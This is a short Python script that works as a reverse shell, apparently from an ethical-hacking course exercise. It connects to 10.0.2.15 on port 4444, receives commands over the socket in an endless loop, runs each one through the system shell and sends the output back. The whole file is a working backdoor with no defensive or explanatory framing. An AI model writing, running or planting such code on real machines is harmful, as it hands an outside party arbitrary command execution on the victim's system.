#!/usr/bin/env python

import socket
import subprocess

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.2.15", 4444))

#connection.send("\n[+] Connection established.\n")

while True:
    command = recieved_data = connection.recv(1024)
    command_result = execute_system_command(command)
    connection.send(command_result)

connection.close()
